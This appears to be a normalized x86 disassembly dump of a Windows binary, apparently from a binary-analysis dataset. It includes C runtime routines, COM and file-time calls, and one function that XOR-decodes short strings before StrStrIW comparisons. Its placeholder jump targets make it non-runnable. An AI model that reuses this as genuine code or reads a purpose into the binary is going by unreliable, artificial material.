cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx eax
call sub_1005ef30
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
xor eax eax
pop ebx
pop ebp
retn
mov [ rw-data ] ebx
mov eax 0x2
pop ebx
pop ebp
retn
sub_1005d5ee
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ eax ]
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_1007f2a0
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_1005d69e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x50
push 0x1
call sub_10067d3a
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x18 ] edi
jne r-xdata
mov esi [ esi + 0xbc ]
push 0x14
pop ecx
mov edi ebx
push 0x4
[ edi ] [ esi ]
call sub_1002fb6b
xor edi edi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
cmp [ esi + 0x1c ] edi
je r-xdata
push ebx
call sub_10035d06
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb4 ]
mov edi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
mov eax [ rw-data ]
mov [ ebx + 0x4 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x8 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x30 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] edi
mov [ ebx + 0x34 ] eax
push 0x4
call sub_1002fb6b
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
push eax
call edi
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x3e ]
push ebx
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1000932c
mov edi eax
lea eax [ ebx + 0x4 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x8 ]
push eax
push 0x10
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x30 ]
push eax
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ ebx + 0x34 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1000932c
add esp 0x14
or eax edi
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push ebx
call sub_100554c6
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ esi + 0xb0 ]
call sub_10035d06
push [ esi + 0xbc ]
call sub_10035d06
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push ebx
call sub_10035d06
push [ ebp - 0x8 ]
call sub_10035d06
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_1005d890
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
push edi
mov edi [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x4 ]
mov [ ebp + 0xc ] edx
cmp edx eax
je r-xdata
push esi
mov esi [ edi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
mov edx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
pop edi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ edi ]
cmp ecx [ edx + 0xc ]
jb r-xdata
mov edx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea eax [ ebp + 0xc ]
mov edx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ eax + 0xc ] esi
jae r-xdata
pop esi
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_1005d8f2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_1005d98d
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1005da40
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ rw-data ]
cmp [ edx + 0xd58 ] 0x0
mov eax [ ebp + 0x8 ]
push ebx
mov ebx eax
jne r-xdata
mov ecx [ r--data ]
push esi
xor eax eax
push edi
and eax 0xffffffc5
mov ebx eax
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0xffee
and esi 0xff
mov [ ebp + eax * 2 - 0xc ] si
inc eax
cmp eax 0x2
jb r-xdata
mov edi [ StrStrIW@IAT ]
lea ecx [ ebp - 0xc ]
lea esi [ edx + 0xda0 ]
push ecx
xor eax eax
push esi
mov [ ebp - 0x8 ] ax
call edi
test eax eax
jne r-xdata
and ebx 0xffffffe4
call sub_1000a0b0
test eax eax
je r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x60
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x9
jb r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
xor eax eax
push esi
mov [ ebp - 0x16 ] ax
call edi
test eax eax
je r-xdata
mov ecx [ r--data ]
xor eax eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
and ebx 0xfffffffc
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffbf
and edx 0xff
mov [ ebp + eax * 2 - 0x14 ] dx
inc eax
cmp eax 0x3
jb r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
xor eax eax
push esi
mov [ ebp - 0xe ] ax
call edi
pop edi
pop esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
and ebx 0xfffffff4
sub_1005db50
mov edi edi
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
pop esi
retn
push esi
call [ LocalFree@IAT ]
sub_1005db80
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi edx
lea esi [ edi + 0x1c ]
push esi
push r--data
push 0x1
push 0x0
push r--data
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x40 ] ecx
call [ CoCreateInstance@IAT ]
test eax eax
jns r-xdata
mov edx 0x3
mov [ ebp - 0x50 ] dx
lea edx [ ebp - 0x28 ]
mov eax 0xc9
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x48 ] 0x1
call sub_10053240
mov ebx [ ebp - 0x50 ]
mov ecx [ esi ]
mov edx [ ecx ]
lea eax [ ebp - 0x30 ]
push eax
push 0x0
lea eax [ ebp - 0x28 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x4c ]
mov [ eax + 0x4 ] ebx
mov ebx [ ebp - 0x48 ]
mov [ eax + 0x8 ] ebx
mov ebx [ ebp - 0x44 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] ebx
call ecx
test eax eax
jns r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x3c ]
lea edx [ ebp - 0x30 ]
push edx
mov [ ebp - 0x2c ] 0x0
call sub_1003c780
test eax eax
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
lea edx [ ebp - 0x34 ]
push edx
mov edx [ ebp - 0x30 ]
xor edi edi
mov [ ebp - 0x34 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
test eax eax
jns r-xdata
mov [ ebp - 0x2c ] 0x3
jmp r-xdata
mov eax [ ebp - 0x34 ]
cmp eax edi
je r-xdata
mov [ ebp - 0x2c ] 0x6
jmp r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
je r-xdata
mov esi [ esi ]
mov eax [ esi ]
mov edx [ eax + 0x88 ]
lea ecx [ ebp - 0x38 ]
push ecx
push esi
call edx
test eax eax
jns r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x34 ] edi
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x40 ]
mov edx [ ebp - 0x38 ]
push eax
call sub_100453a0
mov ecx [ ebp - 0x38 ]
push ecx
call [ SysFreeString@IAT ]
mov [ ebp - 0x2c ] 0x4
jmp r-xdata
sub_1005dcf4
push 0x14
push r--data
call sub_1007fb20
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x18 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] edi
setne al
cmp eax edi
je r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
call sub_100427ff
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
call sub_1007fb65
retn
mov [ ebp - 0x4 ] edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax esi
call sub_1007fc98
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1005dd8a
mov eax [ ebp - 0x20 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ esi ] 0xffffffff
sub_1005dd8a
cmp [ ebp - 0x1c ] edi
je r-xdata
retn
cmp [ ebp - 0x20 ] edi
je r-xdata
push [ esi ]
call sub_1005b23c
pop ecx
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_1005ddc0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test eax eax
je r-xdata
mov edi [ ebp + 0xc ]
cmp edi 0x7ffffffe
jbe r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1000831a
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_10041880
test edi edi
je r-xdata
cmp edx 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp edx 0x8
jb r-xdata
mov edi [ esi + 0x10 ]
lea ecx [ ecx + edi * 2 ]
cmp ecx eax
jbe r-xdata
mov eax esi
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
mov eax [ esi ]
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ ebp + 0x8 ]
push ebx
lea ebx [ edi + edi ]
push ebx
push edx
push eax
call sub_1007f5d0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ ebp + 0xc ]
sub eax ecx
push edx
sar eax 0x1
push eax
push esi
mov ecx esi
call sub_100404a0
pop edi
pop esi
pop ebp
retn 0x8
sub_1005deb0
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
sub eax 0x0
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x87
dec eax
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x18 ]
mov [ esi ] eax
mov eax [ ecx + 0x1c ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x86
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
call sub_10053240
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_1005df30
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x90 ] edi
call sub_100614d0
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x80 ] ebx
mov ecx [ eax ]
push esi
push eax
mov eax [ ecx + 0xdc ]
call eax
push esi
mov edi eax
call [ LocalFree@IAT ]
cmp edi ebx
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x80 ]
lea edx [ ebp - 0x84 ]
mov [ ebp - 0x84 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x84 ]
cmp eax ebx
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
xor edi edi
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0x115
call sub_10053240
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x80 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp - 0x80 ]
lea edx [ ebp - 0x88 ]
push edx
mov [ ebp - 0x88 ] ebx
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x1c ]
call eax
mov ecx [ ebp - 0x88 ]
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0xa2
lea edx [ ebp - 0x8c ]
mov [ ebp - 0x8c ] ebx
call sub_100221d0
test eax eax
je r-xdata
inc edi
cmp edi [ ebp - 0x84 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ ebp - 0x8c ]
mov eax [ ebp - 0x90 ]
push esi
add eax 0x128
call sub_10036c10
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0xca
jmp r-xdata
mov eax [ ebp - 0x88 ]
cmp eax ebx
je r-xdata
call sub_10055530
jmp r-xdata
call sub_10053240
sub_1005e0b0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
push r--data
lea eax [ esp + 0x18 ]
push 0x40
push eax
mov edi ecx
call sub_1005c1c5
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ esp + 0x24 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ebx
push eax
push ecx
push esi
push edi
call sub_100149a0
mov ecx [ esp + 0x84 ]
add esp 0x30
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x18
sub_1005e11a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10061dab
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_1005e150
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_10069cd0
mov edx [ esi ]
push edx
call sub_100187af
add esp 0x14
sub_1005e190
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
mov ecx edi
mov esi ebx
call sub_1001f910
test eax eax
jne r-xdata
mov edx [ edi + 0x108 ]
mov eax [ edi + 0x100 ]
lea eax [ edx + eax + 0x7 ]
lea ecx [ eax + eax * 2 ]
add ecx [ edi + 0x50 ]
mov eax esi
sub eax ebx
cmp eax ecx
jae r-xdata
lea ebx [ ebx ]
lea ebx [ esi - 0x1 ]
lea edx [ ebx - 0x5 ]
mov ecx eax
mov [ ebp - 0x4 ] ecx
cmp eax edx
jb r-xdata
mov eax ecx
mov ecx [ ebp + 0x8 ]
add esi ebx
push esi
push ecx
mov ecx edi
call sub_1001f910
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea esi [ ecx + ebx ]
shr esi 0x1
push esi
push eax
mov ecx edi
call sub_1001f910
test eax eax
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] esi
cmp eax 0x2
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea ecx [ ebx - 0x5 ]
cmp [ ebp - 0x4 ] ecx
jb r-xdata
sub_1005e238
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
mov [ ebp - 0x1 ] 0x0
call sub_10026e29
mov al [ ebp - 0x1 ]
add esp 0x10
leave
retn
sub_1005e270
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0xcc
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_100404a0
mov eax esi
mov esp ebp
pop ebp
retn
sub_1005e29f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_10062fa9
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_100190d3
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_1000447b
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_1003cbd5
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp - 0xc ]
push 0x0
call sub_1006e5c0
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_1005e3b7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
push [ ebp + 0x24 ]
mov edx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10084658
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1005e400
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10089bd8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x5c ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x30
mov esi ecx
lea ecx [ esp + 0x3c ]
push 0x0
push ecx
mov ebx edx
mov [ esp + 0x20 ] eax
mov [ esp + 0x40 ] 0x0
call sub_1007f940
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x58 ]
add esp 0xc
cmp [ esi + 0x44 ] 0x0
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] eax
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
push ebx
lea ecx [ esp + 0x14 ]
push ecx
call [ FileTimeToDosDateTime@IAT ]
mov eax [ esp + 0x34 ]
and eax 0x27
xor ebx ebx
mov [ edi ] ax
cmp [ esi + 0x44 ] ebx
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
lea edx [ esp + 0x4c ]
push edx
call [ FileTimeToLocalFileTime@IAT ]
cmp [ esi + 0x4c ] ebx
je r-xdata
or eax 0x100
mov [ edi ] ax
push ebx
xor eax eax
push r--data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x34 ] 0x7
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] ax
call sub_1005ddc0
lea edx [ esp + 0x18 ]
mov ecx esi
mov [ esp + 0x78 ] ebx
call sub_10064c10
cmp [ esp + 0x2c ] 0x8
mov esi eax
jb r-xdata
mov edx 0x80
or [ edi ] dx
mov eax esi
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x5c ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esp + 0x18 ]
push ecx
call sub_100187af
add esp 0x4
sub_1005e51f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10041a2b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_1005e540
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
pop ebp
retn
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10021f70
add esp 0x8
sub_1005e580
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
